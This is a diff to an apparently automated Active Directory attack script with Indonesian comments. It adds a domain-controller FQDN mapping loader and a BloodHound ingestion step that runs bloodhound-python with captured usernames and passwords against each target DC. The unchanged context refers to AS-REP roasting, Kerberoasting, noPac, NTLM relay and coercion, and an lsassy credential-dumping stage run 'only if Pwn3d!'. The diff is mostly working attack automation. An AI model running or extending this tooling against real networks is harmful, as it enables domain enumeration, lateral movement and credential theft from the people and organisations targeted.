@@ -1614,17 +1614,37 @@ declare -A ASREP_DONE
 declare -A KERB_DONE
 
 # =========================
-# LOAD DC MAPPING (dc_ip;domain)
+# LOAD DC MAPPING (dc_ip;domain;dc_fqdn)
 # =========================
+# Deklarasikan associative array baru untuk menampung FQDN
+declare -A DC_FQDN_MAP
+
 if [[ -s "$DC_INFO" ]]; then
-    while IFS=';' read -r dc_ip dc_domain; do
-        [[ -z "$dc_ip" || -z "$dc_domain" ]] && continue
+    # Membaca 3 kolom: dc_ip, dc_domain, dan dc_fqdn
+    while IFS=';' read -r dc_ip dc_domain dc_fqdn || [[ -n "$dc_ip" ]]; do
+        # Abaikan baris kosong atau baris komentar
+        [[ -z "$dc_ip" || "$dc_ip" =~ ^# ]] && continue
+        
+        # Bersihkan spasi/karakter newline yang tidak terlihat
+        dc_ip=$(echo "$dc_ip" | xargs)
+        dc_domain=$(echo "$dc_domain" | xargs)
+        dc_fqdn=$(echo "$dc_fqdn" | xargs)
+
+        # Simpan IP DC berdasarkan domain
         DC_MAP["$dc_domain"]="$dc_ip"
+        
+        # Simpan FQDN DC berdasarkan domain (jika kolom ke-3 kosong, buat fallback otomatis)
+        if [[ -n "$dc_fqdn" ]]; then
+            DC_FQDN_MAP["$dc_domain"]="$dc_fqdn"
+        else
+            # Fallback jika kolom ke-3 di dc_domain_mapping.txt terlewat/kosong
+            DC_FQDN_MAP["$dc_domain"]="DC-01.$dc_domain"
+        fi
     done < "$DC_INFO"
 
     echo -e "${GREEN}[+] Loaded DC mapping:${NC}"
     for d in "${!DC_MAP[@]}"; do
-        echo -e "    ${CYAN}$d${NC} -> ${YELLOW}${DC_MAP[$d]}${NC}"
+        echo -e "    ${CYAN}$d${NC} -> IP: ${YELLOW}${DC_MAP[$d]}${NC} | FQDN: ${MAGENTA}${DC_FQDN_MAP[$d]}${NC}"
     done
 else
     echo -e "${YELLOW}[!] No DC mapping file found ($DC_INFO)${NC}"
@@ -2007,6 +2027,66 @@ for ip in "${!PROTO_MAP[@]}"; do
 
                             # Bersihkan temporary files
                             rm -f .tmp_nopac .tmp_ntlmref .tmp_coerce_auth
+
+                       # -------------------------------------------------------
+                            # 3. BLOODHOUND INGESTION (Python Collector)
+                            # -------------------------------------------------------
+                            echo -e "\n${YELLOW}[*] AD Recon: Running BloodHound Python Ingestor...${NC}"
+                            
+                            # Buat folder khusus BloodHound agar file JSON hasil dump tidak berantakan
+                            BH_DIR="$OUTDIR/bloodhound_${ip}"
+                            mkdir -p "$BH_DIR"
+                            
+                            # 1. Bersihkan variabel domain agar hanya berisi nama domain bersih (misal: shadow.gate)
+                            CLEAN_DOMAIN=$(echo "$DOMAIN_NAME" | sed 's/^-d //; s/^--domain //')
+                            
+                            # Deklarasikan variabel FQDN default kosong
+                            DC_FQDN=""
+
+                            # Jika file mapping ada, kita ambil Domain dan FQDN-nya sekaligus secara konsisten
+                            MAPPING_FILE="$OUTDIR/dc_domain_mapping.txt"
+                            if [[ -f "$MAPPING_FILE" ]]; then
+                                # Cari baris yang cocok dengan IP target saat ini
+                                MAP_ROW=$(grep "$ip" "$MAPPING_FILE" | head -n 1)
+                                if [[ -n "$MAP_ROW" ]]; then
+                                    # Ambil domain (kolom 2) jika sebelumnya bernilai "auto" atau kosong
+                                    if [[ "$CLEAN_DOMAIN" == "auto" || -z "$CLEAN_DOMAIN" ]]; then
+                                        CLEAN_DOMAIN=$(echo "$MAP_ROW" | cut -d';' -f2 | xargs)
+                                    fi
+                                    # Ambil FQDN langsung dari kolom 3
+                                    DC_FQDN=$(echo "$MAP_ROW" | cut -d';' -f3 | xargs)
+                                fi
+                            fi
+                            
+                            # Fallback jika domain benar-benar tidak terdeteksi
+                            CLEAN_DOMAIN="${CLEAN_DOMAIN:-WORKGROUP}"
+
+                            # 2. Validasi & Fallback untuk DC_FQDN (Wajib berupa format FQDN untuk bloodhound-python)
+                            if [[ -z "$DC_FQDN" || "$CLEAN_DOMAIN" == "WORKGROUP" ]]; then
+                                # Jika mapping kosong/gagal, buat FQDN bayangan yang aman (bukan IP) agar tidak memicu error validator
+                                DC_FQDN="DC01.${CLEAN_DOMAIN}"
+                            fi
+
+                            # [LOGIKA LANGKAH 3 YANG TUMPANG TINDIH SUDAH DIHAPUS DARI SINI]
+
+                            # 3. Eksekusi BloodHound dengan parameter 100% dinamis
+                            BH_CMD="bloodhound-python -d $CLEAN_DOMAIN -dc $DC_FQDN -u '$user' -p '$pass' -ns $ip -c all"
+                            echo -e "${MAGENTA}[CMD] (Inside $BH_DIR) $BH_CMD${NC}"
+                            
+                            # Jalankan di subshell agar tidak mengubah directory kerja script utama
+                            (
+                                cd "$BH_DIR" || exit
+                                timeout 2000s bloodhound-python -d "$CLEAN_DOMAIN" -dc "$DC_FQDN" -u "$user" -p "$pass" -ns "$ip" -c all 2>&1 | tee .tmp_bh
+                            )
+
+                            # Verifikasi hasil dump
+                            if grep -qi "Done writing" "$BH_DIR/.tmp_bh" || ls "$BH_DIR"/*.json &>/dev/null; then
+                                echo -e "${GREEN}[+] BloodHound ingestion successful! JSON files saved in: $BH_DIR${NC}"
+                                rm -f "$BH_DIR/.tmp_bh"
+                            else
+                                echo -e "${RED}[-] BloodHound ingestion failed or timed out.${NC}"
+                                rm -f "$BH_DIR/.tmp_bh"
+                            fi
 
                             # -------------------------------------------------------
                             # 2. LSASSY (With Retry Logic - Only if Pwn3d!)
